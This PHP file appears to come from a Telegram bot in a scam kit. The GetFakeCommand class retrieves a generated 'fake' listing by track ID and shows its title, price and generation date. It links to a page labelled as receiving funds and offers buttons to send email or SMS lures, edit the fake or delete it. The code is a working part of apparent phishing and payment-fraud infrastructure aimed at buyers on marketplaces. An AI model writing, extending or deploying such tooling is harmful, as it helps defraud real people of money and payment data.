<?php

namespace App\Telegram\Commands;

use App\Exceptions\TelegramUserPermissionException;
use App\Models\Fake;
use App\Telegram\Dialogs\CreateFakeDialog;
use Telegram\Bot\Actions;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Telegram\Bot\Keyboard\Keyboard;


/**
 * Class HelpCommand.
 */
class GetFakeCommand extends BaseCommand
{
    /**
     * @var string Command Name
     */
    protected $name = 'getFake';

    /**
     * @var string Command Description
     */
    protected $description = 'Получить данные';

    protected $pattern = '{track_id}';

    /**
     * {@inheritdoc}
     */
    public function handle()
    {
        $track_id = $this->getArguments()['track_id'] ?? null;
        $user = $this->getUser();
        $this->replyWithChatAction(['action' => Actions::TYPING]);
        $fake = Fake::where('track_id', $track_id)->first();

        if (!is_null($fake) && ($user->isAdmin() || $fake->telegram_id === $user->id)) {
            $config = $this->getConfig();
            $btns = $config->get('btns');
            $currency = setting('currency');
            $categoryName = ucfirst($fake->category->name);
            $track_id = $fake->track_id;
            $keyboard = Keyboard::make([
                "inline_keyboard" => [
                    [["text" => "📎 Ссылка чата", "url" => $fake->adminChatLink()]],
                    [["text" => $btns['sendEmail'] ?? '', "callback_data" => "/send email $track_id"]],
                    [
                        ["text" => $btns['sendSms'] ?? '', "callback_data" => "/send sms $track_id"],
                        ["text" => $btns['getSmsBalance'] ?? '', "callback_data" => '/getSmsBalance']
                    ],
                    [
                        ["text" => $btns['edit'] ?? '', "callback_data" => "/editFake $track_id"],
                        ["text" => $btns['delete'] ?? '', "callback_data" => "/deleteFake $track_id"]
                    ],
                ],
                "resize_keyboard" => true,
            ]);
            $text = makeText([
                "☄️ Данные успешно получены",
                "",
                "🆔 Номер объявления: <b>$fake->track_id</b>",
                "🏷 Название: <b>$fake->title</b>",
                "💵 Стоимость: <b>$fake->price</b>$currency",
                "",
                "📆 Дата генерации: <b>{$fake->created_at->format('d.m.Y H:i')}</b>",
                "",
                "🗳 $categoryName: <a href='{$fake->link()}'><b>Получение средств</b></a>"
            ]);
            $this->replyWithMessage([
                "text" => $text,
                "parse_mode" => "html",
                "reply_markup" => $keyboard
            ]);

        } else {
            $this->replyWithMessage([
                "text" => "📂 <b>Объявление не найдено</b>",
                "parse_mode" => "html",
            ]);
        }
    }
}